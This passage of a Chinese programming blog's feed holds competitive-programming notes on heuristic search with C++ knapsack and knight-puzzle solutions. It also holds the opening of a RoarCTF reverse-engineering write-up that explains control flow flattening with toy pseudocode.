class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> goal[<span class="number">5</span>][<span class="number">5</span>]=&#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> qipan[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>&#125;,dy[]=&#123;<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> step)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;1&quot;);</span></span><br><span class="line">    <span class="keyword">if</span>(step&gt;<span class="number">15</span>)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">f</span>())&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,step);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> new_x=x+dx[i],new_y=y+dy[i];</span><br><span class="line">        <span class="keyword">if</span>(new_x&lt;<span class="number">0</span>||new_x&gt;=<span class="number">5</span>||new_y&lt;<span class="number">0</span>||new_y&gt;=<span class="number">5</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">        <span class="keyword">if</span>(step+<span class="built_in">f</span>()&lt;=<span class="built_in">min</span>(ans,<span class="number">15</span>))&#123;</span><br><span class="line">            <span class="built_in">search</span>(new_x,new_y,step+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">int</span> start_x,start_y;</span><br><span class="line">    ans=<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(s[j])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    ;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=s[j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=<span class="number">2</span>;</span><br><span class="line">                    start_x=j;</span><br><span class="line">                    start_y=i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    ;</span><br><span class="line">                    <span class="built_in">perror</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">search</span>(start_x,start_y,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0x7fffffff</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像不开氧气优化会被卡掉，我只能%氧气优化了，因为我实在不知道咋优化了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;继续来学启发式搜索&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
    <category term="search" scheme="http://example.com/categories/icpc/algorithm/search/"/>
    
    
  </entry>
  
  <entry>
    <title>启发式搜索算法</title>
    <link href="http://example.com/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/"/>
    <id>http://example.com/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</id>
    <published>2021-12-15T14:00:00.000Z</published>
    <updated>2021-12-15T17:21:12.677Z</updated>
    
    <content type="html"><![CDATA[<p>来快乐学算法了。</p><span id="more"></span><h2 id="启发式搜索"><a href="#启发式搜索" class="headerlink" title="启发式搜索"></a>启发式搜索</h2><p>启发式搜索（英文：heuristic search）是一种改进的搜索算法。它在普通搜索算法的基础上引入了启发式函数，该函数的作用是基于已有的信息对搜索的每一个分支选择都做估价，进而选择分支。简单来说，启发式搜索就是对取和不取都做分析，从中选取更优解或删去无效解。</p><p>在此之前，本蒟蒻一直就只会dfs和bfs，今天来学学新的搜索算法。经过多重资料的 查阅也是大概得知启发式搜索的大概思路，每次搜索会对之后可能的最优状态估值，如果估出来的值不如当前某些状态，那么我就直接舍弃这个状态。就比如经典01背包问题，我对每一个物品的抉择都有选或者不选两种选择，我发现我不选这个物品，选其它物品所产生的最优解不如我当前选这个解的状态好，那么我直接考虑选择这个而不去搜索不选择这个物品的状态。</p><h3 id="估值函数"><a href="#估值函数" class="headerlink" title="估值函数"></a>估值函数</h3><p>这里需要解释一下我如何判断当前状态是否优于之后的最优状态，那么这里需要这么一个估值函数，估值函数不是真的对那个情况做具体分析，那样的话跟暴力没区别了。我这样考虑，如果剩下所有物品全能放进去都不如我一个放进去价值大，那么我肯定得放这个物品(前提是放得进去，放不进去就别讨论了)。那么这个剩下的所有物品的价值就是我这一个启发式搜索方案的估值函数。</p><p>假如有n样物品，那么在搜索第x样物品的估值函数就是</p><p>$f(x)=\sum _{i=x} ^{n} a[i]$</p><p>我在判断一下这个要不要放的时候我只需要看看我历史最优值是否小于当前最优值+估值函数值就可以了，如果成立那就说明这个可能可以不放，否则这个必须要放，因为如果不放的话，它剩下就算全放都没有我历史搜索出来的最优值大，那么我就没必要搜索不放的情况了。当然这是其中一种启发式搜索的办法。还有其它的方式，我们下面讲。</p><h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><p>来自洛谷<a href="https://www.luogu.com.cn/problem/P1048">P1048 NOIP2005 普及组 采药</a></p><p>那么我按照我之前的启发式搜索方式得到了下面的算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">int</span> v[maxn],c[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=c[now])</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-c[now],value+v[now]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;c[i],&amp;v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以算出正确结果，但是有些点会T</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/1.png" alt="1"></p><p>事实上我这样的启发式搜索方法还是有点暴力，因为后面的物品可能完全一个都放不进去，但是价值很大，这样的数据启发式搜索就会退化成朴素算法。</p><p>那么我如果换一种，我不管什么就一个个放进去看看能有多少最大的价值，为了保证能朴素地算出最大值我们可以先对物品的单位价值排序然后一个个放，而且我们需要假设物品可以分割。那不然的话等于是在后面的物品做一次动态规划，复杂度还是比较高的。所以我们可以得出估值函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;c[i])&#123;</span><br><span class="line">            ans+=v[i];</span><br><span class="line">            res-=c[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+d[i]*res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写出以下的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> c,v;</span><br><span class="line">    <span class="keyword">double</span> d;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;a[i].c)&#123;</span><br><span class="line">            ans+=a[i].v;</span><br><span class="line">            res-=a[i].c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+(<span class="keyword">int</span>)(a[i].d*res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=a[now].c)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-a[now].c,value+a[now].v);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now,contain)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> item &amp;a, <span class="keyword">const</span> item &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a.d &gt; b.d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int cmp(item a,item b)&#123;</span></span><br><span class="line"><span class="comment">    if(a.d&lt;b.d)return 0;</span></span><br><span class="line"><span class="comment">    return 1;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a[i].c,&amp;a[i].v);</span><br><span class="line">        a[i].d=(<span class="keyword">double</span>)a[i].v/a[i].c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功AC。</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2.png" alt="2"></p><p>由此可见，只要我们选的估值函数够好，那么搜索它就不会那么暴力了，这大概也是启发式搜索算法的精髓，只要估值函数选的好，复杂度能直接从指数级降到(其实我也不知道是多少hhh)，但是个人觉得，只要估值函数写出来了，都是没问题的，因为代码量本身就很少，只是在做决策之前估计以下这一步到底值不值得就好了，然后就是递归大法好，可以看到我的search函数本身就这几句。</p><p>那么在这样的搜索里面启发式算法的估值函数很容易求，但是如果是迷宫类的问题，启发式算法还真的就难说了，等明天去看看迷宫类的启发式搜索吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;来快乐学算法了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
    <category term="search" scheme="http://example.com/categories/icpc/algorithm/search/"/>
    
    
  </entry>
  
  <entry>
    <title>RoarCTF2019 polyre writeup writeup</title>
    <link href="http://example.com/2021/12/15/[RoarCTF2019]polyre%20writeup/"/>
    <id>http://example.com/2021/12/15/[RoarCTF2019]polyre%20writeup/</id>
    <published>2021-12-15T02:00:00.000Z</published>
    <updated>2021-12-15T12:25:49.419Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录-<a href="https://buuoj.cn/challenges#[RoarCTF2019]polyre">RoarCTF2019 polyre</a></p><span id="more"></span><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>拿到文件ida打开，发现是很绝望的究极无敌的代码混淆——控制流平坦化。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/1.png" alt="1"></p><h3 id="控制流平坦化介绍"><a href="#控制流平坦化介绍" class="headerlink" title="控制流平坦化介绍"></a>控制流平坦化介绍</h3><p>控制流平坦化(control flow flattening)的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，例如下图是正常的执行流程 </p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/2.png" alt="2"></p><p>在经过控制流平台化的混淆之后，会变成如下的结构</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/3.png" alt="3"></p><p>流程图看起来就像是同一级的关系，块之间失去了层次分明，逻辑可读性变得更差。</p><p>就好比我们平时做的堆菜单题，选择菜单的时候，逻辑基本就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    menu();</span><br><span class="line"><span class="keyword">int</span> num=getnum();</span><br><span class="line">    <span class="keyword">switch</span>(num)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">delete</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            error_choice();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有时候经过ida反编译并不是那么清晰的，我也不知道它是不是特意加了混淆还是ida本身的问题，反编译代码变成了下面的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                    menu();</span><br><span class="line"><span class="keyword">int</span> num=getnum();</span><br><span class="line">                    <span class="keyword">if</span>(num!=<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    add();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(num&gt;<span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                edit();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            show();</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span>(num!=<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        edit();</span><br><span class="line">&#125;</span><br><span class="line">    error_choice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么说吧，两个代码实现的功能是一样的，但是明显下面的可读性就变差了很多。我也不知道是不是这个在作妖，就是觉得很像，提出来讲一讲hhh。</p><p>但是好像又没有关系，因为它们块之间的关系本来就是平坦的，后面只是用while替代switch进行进一步混淆，但是其实有menu函数一看便知，所以它在这里加这样的逻辑混淆的确是无用功。</p><p>那么我猜控制流平坦化的流程就是：</p><p>①将所有块平坦化</p><p>②用switch分发</p><p>③把switch转成如上的那种while循环包起来的代码。</p><p>至于平坦化了之后如何实现前后的逻辑的关系呢？其实很简单，比如下面这个逻辑</p><p>假如明天下雨，那么我带伞，然后出门，否则我带上我的自行车，然后出门，写成伪代码是下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rain)&#123;</span><br><span class="line">get_umb();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">get_bike();</span><br><span class="line">&#125;</span><br><span class="line">go_out();</span><br></pre></td></tr></table></figure><p>代码这么写起来看起来逻辑还是十分清晰的，那么如果加控制流平坦化混淆它会变成什么样呢？这里很明显出现三个语句块，如果rain条件成立，那么get_umb()，否则get_bike()，最后一定会执行go_out()。那么get_umb和get_bike就是一个二选一的关系，这俩块跟go_out又是先后的关系，这是我们一眼可以看出来的逻辑。</p><p>控制流平坦化第一步就是拆掉他们这样的逻辑关系，甭管有多少块，全部用while(1)+switch去控制，如下代码所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ch=rain;</span><br><span class="line"><span class="keyword">switch</span>(ch)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>：</span><br><span class="line">get_bike();</span><br><span class="line">ch=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">get_umb();</span><br><span class="line">ch=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span 